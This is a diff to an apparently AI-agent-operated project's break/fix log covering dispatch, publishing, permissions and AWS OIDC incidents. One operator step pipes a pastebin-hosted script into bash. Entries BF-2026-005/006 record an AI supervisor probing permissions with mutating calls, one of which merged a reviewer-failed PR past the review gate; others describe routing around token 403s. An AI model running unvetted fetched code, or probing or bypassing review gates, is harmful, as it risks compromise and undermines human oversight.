@@ -206,6 +206,55 @@ ContinuityOps incidents yet.
   `Publish-CodexCloudTask.ps1` remain fallbacks. Supervisor reviews PRs /
   re-nudges missing markers. Keepwarm = supervisor-authored `@codex` on #4.
 
+### BF-PRE-019 — App container sees only the default branch (CO-009)
+
+- Observed risk: the Codex GitHub App container clones only the repository
+  default branch (`main`) and carries no `origin` remote. A worker dispatched
+  for a task whose contract or baseline lives on a non-default branch (e.g.
+  `stream/S0-baseline-audit`) cannot read it, silently falls back to the `main`
+  tree, and records a `contract_read=UNAVAILABLE` gap or a mismatched baseline
+  (see CO-008/CO-009 from the P0-T01 App round, PR #6). The same isolation
+  blocks outbound publication from inside the sandbox (BF-PRE-018).
+- Control: when dispatching an App-path round, never assume non-default-branch
+  readability. Either (1) context-package the needed contract/baseline/upstream
+  material directly into the issue body ("the worker gets data, not
+  permission", D-028), or (2) merge the required material to `main` first and
+  dispatch afterward. The publication surface is the owner's platform **Create
+  PR** or the control-center `codex cloud apply` + push — never in-container
+  `git`/`gh`. Any evidence produced against the wrong tree is candidate-bound
+  and must be refreshed once the authoritative baseline is frozen.
+
+### BF-PRE-020 — Workers never commit lockfiles
+
+- Risk: bounded workers may commit regenerated lockfiles from transient or
+  container-local dependency state, creating noisy or misleading integration
+  changes outside the task contract.
+- Control: workers never commit lockfiles. If dependencies legitimately change,
+  the integrator regenerates lockfiles at integration time and binds that
+  regeneration to the integration evidence.
+
+### BF-PRE-021 — Fresh-install first test run may be flaky
+
+- Risk: the first test run after a fresh install can fail from cache warm-up or
+  one-time toolchain initialization rather than a product defect.
+- Control: integration runs the suite twice after install. A recurring failure
+  must capture full error output before repair; a one-time first-run failure is
+  recorded as warm-up evidence rather than silently ignored.
+
+### BF-PRE-022 — Detached local Codex exec must not block on stdin
+
+- Risk: a local detached `codex exec` can hang or consume unintended input when
+  stdin remains attached, wasting worker budget or blocking the lane.
+- Control: any local detached `codex exec` redirects stdin from `/dev/null`.
+  Prefer the warm cloud lane for long tasks.
+
+### BF-PRE-023 — Mock-green is not runtime-proven
+
+- Risk: unit-green results under mocked runtimes can be misrepresented as proof
+  of platform behavior.
+- Control: every platform behavior claim requires a real-runtime gate before it
+  counts as evidence; mocked-unit success is useful but not runtime proof.
+
 ## Entry template
 
 ```markdown
@@ -236,24 +285,217 @@ ContinuityOps incidents yet.
 - **Verified by:**
 ```
 
+## Session retrospective 2026-07-16/17 — problem→solution index
+
+| Problem | Final solution | Entry/decision |
+| --- | --- | --- |
+| Cursor assumption failed: workers could not rely on the earlier Cursor-lane framing for autonomous dispatch. | Move dispatch to the Codex GitHub App path and record the App/default-branch limits explicitly. | D-031 / BF-PRE-019 |
+| CO-005 credential injection proposal would have moved auth material into a worker container. | Reject credential injection; use platform authentication plus zero-secret Codex Cloud Environments. | D-026 / D-035 |
+| `make_pr` metadata hallucination made worker text look complete without a GitHub PR. | Treat `make_pr` as metadata only and require patch-in-comment output for unattended publish. | D-033 → D-034 |
+| App sandbox could not publish with `git push` or `gh pr create`. | Use the GitHub Actions mechanical publisher as the primary path. | D-034 / BF-PRE-018 |
+| Nested fenced blocks truncated extracted patches. | Replace regex extraction with structured line scanning. | BF-2026-001 |
+| Publisher dirty-tree changes and stale `base_sha` checkout aborted publication. | Run extractor out of tree, hard-reset before failure handling, and re-trigger through the workflow path. | BF-2026-002 |
+| PRs created with `GITHUB_TOKEN` did not trigger CI. | Use an owner empty commit for current validation; permanent workflow/identity solution remains pending. | BF-2026-003 |
+| CI whitespace validation reported semantic Markdown line-ending spaces across the whole tree. | Scope whitespace checks to changed files and explicitly exempt semantic Markdown formatting. | BF-2026-004 |
+| Supervisor absorbed too much orchestration responsibility. | Restore role boundaries: episodic GPT rounds carry orchestration while the supervisor handles stream boundaries and actuation. | D-030 / D-035 compliance |
+| Validator lifecycle was coupled to unavailable future harness assets. | Fixture the validator lifecycle and keep the issue open through the P0-T03 repair lane. | CO-010 → P0-T03 |
+| Token consumption rose from per-round supervision and review work. | Apply D-032 supervisor economy, D-037 per-PR reviewer delegation, and session rotation. | D-032 / D-037 |
+| Plan-mode capability probe accidentally created GitHub issue #33. | Close immediately as not_planned; never create Issues to probe permissions; use inspect-only checks. | BF-2026-006 |
+| Cursor App seat lacked Issues write (CO-011). | Owner injected expanded `GH_TOKEN` (Issues + Pull Requests); App ghs_ remains Issues-403; seat actuates via owner PAT. | D-040 / CO-011 resolved |
+| Human directed P0-T03 redo rather than merge draft PR #32. | Supersede #32; fresh fixer + D-037 under D-039 write_scope. | supervisor resume 2026-07-17 |
+| Role creep: supervisor absorbing orch; promotion needed for economy. | D-041 chief (boundary/escalation) + junior 5.6 Sol med (actuation) + Grok monitor→chief. | D-041 |
+
 ## Log
 
 ### 2026-07-18 — ContinuityOps live AWS via GHA OIDC (standalone wiring)
 
 - **Break:** Cloud agents treated live AWS as impossible / blocked on
-  CursorCloudAgent `NoCredentials` (BF-PRE-002). Standalone ContinuityOps had
-  no promoted CI OIDC role or plan/apply workflow; monorepo PR #30 still trusted
-  aws-landing-zone-lab `repository_id` `1296742987`.
+  CursorCloudAgent `NoCredentials` (BF-PRE-002 / BF-2026-010). ContinuityOps
+  needed a promoted CI OIDC role distinct from `project-a-lzlab-gha`; monorepo
+  PR #30 still trusted aws-landing-zone-lab `repository_id` `1296742987`.
 - **Fix:** Add `terraform/ci-bootstrap/` + CloudShell
   `bootstrap-oidc-cloudshell.sh` (REPO_ID accept/discover; ContinuityOps id
   `1301990908`). Promote `.github/workflows/continuityops-terraform.yml`
-  (plan/apply, role `continuityops-gha`, account `283077380808`). Minimal
-  `terraform/environments/{staging,recovery-lab}` roots for OIDC plan smoke.
-  AGENTS.md doctrine: escalate via GHA, not Cursor STS; do not reuse
-  `project-a-lzlab-gha`.
+  (plan/apply, role `continuityops-gha`, account `283077380808`, roots under
+  `terraform/envs/`). AGENTS.md doctrine: escalate via GHA, not Cursor STS.
 - **Operator still required once:** CloudShell
   `REPO_ID=1301990908 curl -fsSL https://paste.rs/gHlj9 | bash`, create GitHub
   Environment `continuityops`, dispatch ContinuityOps Terraform plan.
   Repo-only wiring without CloudShell will not make OIDC green.
 
-No earlier ContinuityOps execution failures were recorded before this entry.
+## 2026-07-17 — BF-2026-001 — Patch publisher truncates diffs containing nested code fences
+
+- **Slice/task:** dispatch infrastructure (D-034 publisher); blocked rounds #17 (ORCH-ROUND-04) and #18 (P0-T02)
+- **Baseline SHA:** ea18cfc9fb29153078652434b7e64ff0cf71e27b
+- **Candidate SHA at break:** worker-side commits only (881e512 in-sandbox); nothing landed
+- **Environment/identity:** GitHub Actions `codex-patch-publish` / ephemeral GITHUB_TOKEN
+- **Symptom:** `publish-failed (D-034): git apply failed … corrupt patch at patch.diff:10` on both rounds
+- **Exact failed check and exit:** `git apply --index patch.diff` exit ≠ 0 in the publish job
+- **Raw failure evidence:** issue #18 comment 5003849152; issue #17 analogous
+- **Attempts:** 1 per round (no auto-retry, by design)
+- **Root cause:** `scripts/extract-codex-patch.sh` captured the fenced diff with a non-greedy regex ending at the FIRST ``` — but both patches legitimately add file content containing ```json fences, so extraction truncated the patch mid-hunk
+- **Why earlier gates missed it:** both D-034 smokes (#12/#14) were single-line text files with no nested fences; the failure class needs markdown/code content inside the diff
+- **Blast radius:** publish path only; worker computations intact in task pages; no repo corruption (failed apply aborts before push)
+- **Decision:** fix the parser structurally; re-nudge workers to repost patches unchanged (fresh bot comment re-triggers the fixed publisher; no recompute)
+- **Fix and files changed:** line-based structural fence scan in `scripts/extract-codex-patch.sh` — inside a unified diff every content line carries a prefix, so a bare ``` at column 0 can only be the closing fence
+- **Regression control added:** nested-fence fixture (json fence inside an added file) run through extract + `git apply --check` — passing locally; CI-fixture step queued as follow-up
+- **New candidate SHA:** (this commit)
+- **Fresh verification commands/results:** fixture extract → `OK: wrote patch.diff (2 paths, 1 chunk(s))`; `git apply --check` → OK
+- **Hosted/cloud verification:** next publisher run on reposted #17/#18 patches
+- **Superseded evidence:** none (no evidence was produced by the failed runs)
+- **New evidence:** publisher run logs on the reposted rounds
+- **Claim/status changes:** none (infrastructure)
+- **Judge round impact:** none (pre-slice-freeze)
+- **Remaining risk/follow-up:** a bare ``` as literal diff *content* at column 0 (e.g. a patch adding an unindented fence line to a md file appears as `+```` so it is safe; only a context line consisting of ``` could confuse — not producible in our added-file patches); CI fixture step to make the regression control permanent
+- **Verified by:** supervisor (fixture), publisher (pending live rerun)
+
+### BF-2026-002 — App 发布器 chmod 脏树与旧 base_sha 切换中止
+
+- Observed break: App-path patch 发布器在工作树内对提取器执行 `chmod`，导致发布前出现未预期脏树；随后旧 `base_sha` 切换中止，两轮发布静默失败，监督者无法获得可审查 PR。
+- Impact: D-034 机械发布链路未能按预期把 Codex diff 应用并开 PR，P0-T02 合并收尾被延迟。
+- Detection: 监督者检查发布结果时发现没有 `publish-ok`/PR URL，且失败轮次缺少足够可见通知。
+- Root cause: 发布器准备步骤在仓库工作树内变更文件权限，并在旧基线切换失败后没有以通用失败通知把错误返回到调度线程。
+- Fix: 提取器改为出树运行；发布失败前执行 `reset --hard` 清理工作树；通过 `workflow_dispatch` 重触发；增加通用失败通知。修复提交：`7640d80`。
+- Verification: 本轮保留 P0-T02 post-merge 验证输出于 `evidence/slices/S0/validation/p0-t02-postmerge.txt`，并在 `STREAM_COMPLETE-P0-T02.json` 绑定验证命令、退出码、时间与证据路径。
+- Prevention controls: 保持提取器出树运行、失败前硬重置、`workflow_dispatch` 重触发和通用失败通知；后续在 CI 增加发布器夹具测试，覆盖 chmod 脏树、旧 base_sha、缺 patch marker 与失败通知路径。
+- Status: repaired_pending_supervisor_review.
+
+### BF-2026-003 — GITHUB_TOKEN 创建的 PR 不触发 workflows
+
+- Observed break: 由 `GITHUB_TOKEN` 创建的发布 PR 未触发后续 workflow，符合 GitHub 防递归行为；监督者需要 owner 身份空提交才能触发 validate。
+- Impact: PR 可被机械创建，但缺少自动 validate 反馈，流边界裁决需要额外人工或 owner 操作。
+- Detection: 发布 PR 出现后未产生预期 validate 运行。
+- Root cause: GitHub 默认抑制由 `GITHUB_TOKEN` 触发的递归 workflow。
+- Fix: 暂无最终修复；当前操作要求监督者以 owner 身份空提交触发 validate。
+- Verification: 待决方案尚未实施，本条记录为已知控制平面缺口。
+- Prevention controls: 候选方案一是在 `validate.yml` 增加 `workflow_dispatch` 触发；候选方案二是发布器改由符合权限边界的 PAT 建 PR。两者均待监督者/owner 决策。
+- Status: open_pending_decision.
+
+## 2026-07-17 — BF-2026-004 — CI whitespace check reported semantic Markdown line endings
+
+- **Slice/task:** repository validation workflow (`validate.yml`) after the first hosted run.
+- **Baseline SHA:** 09e271643326b6e55a24e96e6b9c7841c0342813.
+- **Candidate SHA at break:** pre-fix hosted validation candidate before commit `f1bbc95`.
+- **Environment/identity:** GitHub Actions validate workflow.
+- **Symptom:** the first `validate.yml` run treated semantic Markdown trailing double spaces across the tree as whitespace errors.
+- **Exact failed check and exit:** hosted whitespace validation step exited non-zero after scanning all repository Markdown instead of only the changed surface.
+- **Raw failure evidence:** hosted validate run that preceded commit `f1bbc95`.
+- **Attempts:** one same-class hosted validation failure before repair.
+- **Root cause:** the hygiene check was global and did not distinguish Markdown's meaningful two-space hard line breaks from accidental trailing whitespace in changed files.
+- **Why earlier gates missed it:** local contract checks focused on JSON parsing and patch hygiene, not the hosted workflow's whole-tree whitespace policy.
+- **Blast radius:** validation infrastructure only; no product/runtime claim changed.
+- **Decision:** constrain hygiene validation to changed files and make the Markdown semantic-format exemption explicit.
+- **Fix and files changed:** commit `f1bbc95` changed the workflow logic to use diff-scoped checks and exempt `*.md` semantic hard-break formatting.
+- **Regression control added:** hygiene checks must operate on changed files only, and semantic formatting exemptions must be listed explicitly.
+- **New candidate SHA:** f1bbc95.
+- **Fresh verification commands/results:** hosted validation after `f1bbc95` expected to pass the repaired whitespace policy; current governance round also reruns JSON contract parsing and `git diff --check`.
+- **Hosted/cloud verification:** validate workflow rerun after the owner/automation trigger.
+- **Superseded evidence:** the initial failing whole-tree whitespace report.
+- **New evidence:** repaired validate run and this break/fix entry.
+- **Claim/status changes:** record the workflow-policy issue as repaired infrastructure behavior, not a product defect.
+- **Judge round impact:** previous candidate-bound validation evidence from before the repair is superseded.
+- **Remaining risk/follow-up:** keep any future whitespace expansion diff-scoped; do not reintroduce global Markdown trailing-space failures.
+- **Verified by:** supervisor/orchestrator governance review.
+
+## 2026-07-17 — BF-2026-005 — Accidental merge of PR #30 during permissions probe
+
+- **Slice/task:** supervisor actuation / D-037 merge gate; PR #30 (P0-T03 mechanical publish from issue #28).
+- **Baseline SHA before probe:** tip preceding `2eda7e4` (post-review context-pack `73ae5fc`).
+- **Candidate SHA at break:** `2eda7e4` (`probe-should-fail-dry` merge commit of PR #30).
+- **Environment/identity:** Cursor cloud supervisor App token (can push/merge; lacks `issues:write`).
+- **Symptom:** despite D-037 reviewer verdict fail SCOPE-001 on issue #31, a merge-API probe with commit message `probe-should-fail-dry` actually merged PR #30 to `main`.
+- **Exact failed check and exit:** D-037 structured verdict fail SCOPE-001 (write_scope escape: `scripts/project.mjs`, `tests/index.mjs`, `tests/package.json`, `evidence/slices/S0/validator-contract.json` outside then-current P0-T03 write_scope).
+- **Raw failure evidence:** merge commit `2eda7e4`; revert commit `94f4e33`; CO-012; issue #31 verdict (Issues API 403 from this seat).
+- **Attempts:** one accidental merge; immediate revert.
+- **Root cause:** using the GitHub merge API as a permission probe; the call succeeded and landed product content that the reviewer had already failed.
+- **Why earlier gates missed it:** D-037 fail was recorded, but the probe path bypassed the CI-green + verdict-pass merge signal.
+- **Blast radius:** transient `main` pollution with out-of-scope P0-T03 paths; reverted; no Phase-1 authorization change.
+- **Decision:** revert immediately; do not re-merge #30 until D-039 write_scope expansion stands and a fresh fixer/reviewer cycle passes; record prevention control.
+- **Fix and files changed:** revert commit `94f4e33` (`Revert "probe-should-fail-dry"`); governance repair lands D-039/D-040/CO-011/CO-012 in this round.
+- **Regression control added:** never call the merge API for permission probes; use OPTIONS, dry-run, or inspect-only endpoints; merge only when CI is green **and** D-037 reviewer verdict passes.
+- **New candidate SHA:** `94f4e33` (clean tip after revert); subsequent governance candidate is this ORCH-ROUND-06 repair commit.
+- **Fresh verification commands/results:** `git log -2 --oneline` shows revert atop probe; `main` tip `94f4e33` before governance repair.
+- **Hosted/cloud verification:** N/A for the revert itself; next P0-T03 land requires hosted CI + D-037 pass.
+- **Superseded evidence:** any claim that PR #30 merged under D-037 pass is void.
+- **New evidence:** `evidence/slices/S0/SUPERVISOR_ACTUATION-2026-07-17.json`; this break/fix entry.
+- **Claim/status changes:** PR #30 content remains unmerged on `main`; D-037 SCOPE-001 still stands until write_scope ratification + new cycle.
+- **Judge round impact:** prior reviewer fail remains authoritative; repair cohort must be fresh after scope amendment.
+- **Remaining risk/follow-up:** restore `issues:write` (CO-011) before App-path re-dispatch; human may veto D-039.
+- **Verified by:** Cursor supervisor bottleneck fixer (git history).
+
+## 2026-07-17 — BF-2026-006 — Accidental Issues create during plan-mode capability probe
+
+- **Slice/task:** supervisor resume reconstruct / CO-011 capability check.
+- **Baseline SHA:** `832ce38baa2d8d776fd93169b32e317f3da17a30` (appendix on `main`).
+- **Candidate SHA at break:** N/A (no product merge); GitHub issue #33 created and closed.
+- **Environment/identity:** Cursor cloud portfolio supervisor with owner `GH_TOKEN` (PAT) present in the new run.
+- **Symptom:** while verifying whether Issues write was restored, a `gh api …/issues -f title=probe-should-not-create` call created issue [#33](https://github.com/nathanielecon/ContinuityOps/issues/33) (`probe-should-not-create`).
+- **Exact failed check and exit:** process/discipline failure — not a CI failure. Issue was closed within seconds as `not_planned` with explicit non-dispatch body.
+- **Raw failure evidence:** issue #33 timeline (create → close `not_planned` → clarifying comment).
+- **Attempts:** one accidental create; immediate close.
+- **Root cause:** using a mutating Issues create call as a permissions probe (same class as BF-2026-005 merge-API probe).
+- **Why earlier gates missed it:** plan-mode reconstruct treated live API capability mapping as read-only; create was not gated.
+- **Blast radius:** one closed noise issue; no branch/PR/product impact; no secrets exposed.
+- **Decision:** close #33; record prevention; treat expanded `GH_TOKEN` as restoring Issues+PR actuation for this seat; close CO-011 on first intentional `@codex` / queue write (not on the probe).
+- **Fix and files changed:** issue #33 closed; this break/fix entry; `OPERATING_STATE.md` revision for redo path.
+- **Regression control added:** never create Issues, comments, labels, or merges to probe permissions; use GET/inspect-only (and documented token scope headers) before any mutation. Capability probes must be read-only.
+- **New candidate SHA:** this supervisor-resume hygiene commit.
+- **Fresh verification commands/results:** `gh api repos/…/issues/33 --jq .state` → `closed`; `gh api repos/…/pulls/32` succeeds with owner PAT (expanded scopes).
+- **Hosted/cloud verification:** N/A (governance/discipline).
+- **Superseded evidence:** any claim that CO-011 remains blocking for this PAT-backed seat is void after intentional queue write.
+- **New evidence:** this entry; subsequent `codex-dispatch` issue for P0-T03 redo.
+- **Claim/status changes:** CO-011 → resolved for this seat via owner `GH_TOKEN`; human directed **redo** of P0-T03 (do not merge PR #32).
+- **Judge round impact:** none.
+- **Remaining risk/follow-up:** Cursor App `ghs_` token may still 403 on Issues; keep using owner PAT for `@codex` / keep-warm; do not reintroduce mutate-to-probe habits.
+- **Verified by:** portfolio supervisor (resume seat).
+
+## 2026-07-17 — BF-2026-007 — H0 plan_sha256 drifted after PLAN state bump
+
+- **Slice/task:** P0-T04 / H0 packaging.
+- **Symptom:** After marking P0-T04 `review` in `PLAN.md` and packaging H0, `node harness/rubrics/validate-rubric-freeze.mjs` failed with `plan_sha256 与当前文件不匹配`.
+- **Root cause:** Bundle hashes were pinned at P0-T04 integrate tip; subsequent PLAN.md authority edits changed `plan_sha256` without refreshing `evidence/slices/S0/rubric-freeze.json`.
+- **Fix:** Recompute and refresh pinned hashes in `rubric-freeze.json` + `H0_PACKAGE.md`; re-run validator to pass.
+- **Prevention:** Any PLAN/authority edit after rubric freeze must refresh H0-bound hashes before presenting the package for human signature; never ask humans to sign stale digests.
+- **Verified by:** portfolio supervisor (`validate-rubric-freeze.mjs` pass after refresh).
+
+## 2026-07-18 — BF-2026-008 — Junior App sandbox cannot actuate with gh
+
+- **Slice/task:** D-041 junior supervisor / JR-SUPER-01.
+- **Symptom:** Junior correctly left `waiting_human` after H0 verify, but reported no GitHub actuation channel (no remote, `gh` forbidden, API CONNECT 403). Heartbeat that assumed in-sandbox `gh pr merge` / issue create stalled; D-034 `publish-failed` fired on a legitimate `no_repo_mutation` reply.
+- **Root cause:** Charter said junior "actuates" while the carrier is the Codex App sandbox, which is receive-only by D-034/D-026 (credentials never move).
+- **Fix:** D-042 — `.github/workflows/junior-actuate.yml` + `continuityops-merge-v1` / `continuityops-dispatch-v1` intents; GHA/`GITHUB_TOKEN` performs merge and `@codex` posts. Docs updated (`JUNIOR_SUPERVISOR`, `QUEUE`, `AGENTS`, snippet).
+- **Prevention:** Never instruct App rounds to call `gh`; treat actuation as mechanism; keep Actions workflow permissions Read/write + create-PR (owner UI; PAT cannot set via API).
+- **Verified by:** chief supervisor (parser unit tests); end-to-end actuate-ok pending first merge intent after land.
+
+## 2026-07-18 — BF-2026-009 — Upstream A/C trees not readable from Grok worker token
+
+- **Slice/task:** S1 / P1-T01.
+- **Symptom:** `gh api .../contents` and `git clone` for `aws-landing-zone-lab` / `local-first-governed-cicd` return 403 (accepted permission: metadata=read only).
+- **Root cause:** D-028 — worker gets data not permission; PAT lacks contents scope on private upstreams.
+- **Fix:** ContinuityOps-side adapter contracts + `missing_capabilities` (MC-A-TREE, MC-C-TREE, MC-C-DIGEST); `image_digest=UNAVAILABLE`; claim ceiling L1.
+- **Prevention:** Control-center must supply D-028 context package or vendored snapshot before raising upstream-derived claims above L1; never invent digest/export values.
+- **Verified by:** Grok D-043 S1 worker (static tests + validators).
+
+## 2026-07-18 — BF-2026-010 — Lead agent dependencies vs Cursor Pro+ AWS identity
+
+- **Slice/task:** Portfolio / Phases 1–8 live claim elevation; chief supervisor seat.
+- **Symptom:** Agents treated `NoCredentials` + set `CURSOR_AWS_ASSUME_IAM_ROLE_ARN` as an unfinished Cursor injection bug and blocked. ContinuityOps is `portfolio-certified-L1`; live L4+ needs a working apply control plane.
+- **What was actually fixed (2026-07-14/15) — owner-confirmed:**
+  | Path | Evidence |
+  | --- | --- |
+  | **GitHub OIDC → `project-a-lzlab-gha`** | Role last used **2026-07-15**; successful `landing-zone-lab.yml` runs; live lab under `assumed-role/project-a-lzlab-gha` |
+  | **`CursorCloudAgent` injection** | Role created Jul 14; **never assumed** (`RoleLastUsed` empty; CloudTrail only `CreateRole` / `AttachRolePolicy`) |
+- **Root cause:** Individual/Pro+ plan has **no team External ID**. Dashboard **Settings → Advanced / Bedrock IAM Role** (Teams/Enterprise only) is absent on Pro+. Secret/`CURSOR_AWS_ASSUME_IAM_ROLE_ARN` may be set and role may trust `arn:aws:iam::289469326074:role/roleAssumer` (no External ID condition), but Cursor **will not inject** `AWS_PROFILE` / `cursor-cloud-agent` without that External ID. Using Team ID as External ID is wrong. Prior “fix” was **change control plane**, not finish Cursor STS.
+- **Target account (not a secret):** `283077380808` / root `arn:aws:iam::283077380808:root`. CI role: `arn:aws:iam::283077380808:role/project-a-lzlab-gha`. Env string only: `.../role/CursorCloudAgent`.
+- **Fix / control (workarounds in order):**
+  1. **Proven — GitHub OIDC:** Cloud seat edits repo only; CI applies — e.g. `gh workflow run landing-zone-lab.yml --repo nathanielecon/cloud -f action=plan|apply` with `id-token: write` and `AWS_ROLE_ARN_LZ_LAB` / default `project-a-lzlab-gha`.
+  2. **Proven — local bottleneck:** laptop `aws login` as account `283077380808`; orchestrator runs apply/evidence locally; Cloud seat stays repo-only.
+  3. **Only if insisting on in-pod AWS:** upgrade to Teams → Bedrock IAM Role → Validate & Save → External ID in `CursorCloudAgent` trust → **new** Cloud Agent pod.
+  4. **Do not:** put long-lived access keys or root session tokens in Cloud secrets.
+  5. **Do not block** on `CURSOR_AWS_ASSUME_IAM_ROLE_ARN` / in-VM STS on Pro+.
+- **Regression control added:** Stuck-agent paste + “What actually fixed live AWS” table + injection stop table in `AGENTS.md`. Phrase: **injection absent — stop; no keys.**
+- **Fresh verification (this ContinuityOps Cloud seat, 2026-07-18):** `AWS_PROFILE=<unset>`; STS `NoCredentials`; role ARN secret set → stop; no keys. Portfolio remains `portfolio-certified-L1`.
+- **Hosted/cloud verification:** GHA OIDC (`nathanielecon/cloud` / ContinuityOps workflows) or local bottleneck only.
+- **Claim/status changes:** none elevated by chasing Cursor STS.
+- **Remaining risk/follow-up:** when elevating ContinuityOps S1–S7 to L4+, dispatch apply via ContinuityOps OIDC (`continuityops-gha` / `continuityops-terraform.yml`) or local bottleneck; return evidence to this repo.
+- **Verified by:** chief supervisor + owner historical evidence paste (2026-07-18).
